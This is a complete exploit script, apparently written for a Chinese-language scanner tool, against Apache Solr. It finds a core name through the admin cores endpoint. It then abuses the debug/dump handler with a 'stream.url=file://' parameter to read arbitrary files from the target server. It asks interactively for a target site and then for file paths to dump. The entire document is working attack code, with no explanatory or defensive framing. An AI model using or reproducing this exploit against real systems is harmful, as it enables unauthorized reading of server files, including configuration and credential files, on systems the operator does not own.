# define insqian = "name":"
# define inshou = "
# define contentqian = "stream":"
# define contenthou = "}]
function Getinstance(url)
{
    res = HttpGetSafe(url.
"/solr/admin/cores?indexInfo=false&wt=json", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
if (StrFindStr(res[0], "initFailures", 0) == "-1"){
return "";
}
return GettextMiddle(res[0], insqian, inshou);
}
function
GetFileContent(url, ins, FilePath)
{
res = HttpPostSafe(url.
"/solr/".ins.
"/debug/dump?param=ContentStreams&wt=json", "stream.url=file://".FilePath, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0");
con = GettextMiddle(res[0], contentqian, contenthou);
return StrReplace(con, "\\n", StrRN());

}

function
main(args)
{
print("请输入测试的站点:");
url = input();
ins = Getinstance(url);
if (ins == ""){
print("不存在漏洞");
} else {
print("可能存在漏洞,instanceName:".ins.",请输入要查看的文件名称:");
wb = input();
while (wb != "exit"){
print(GetFileContent(url, ins, wb));
wb = input();
}
}
}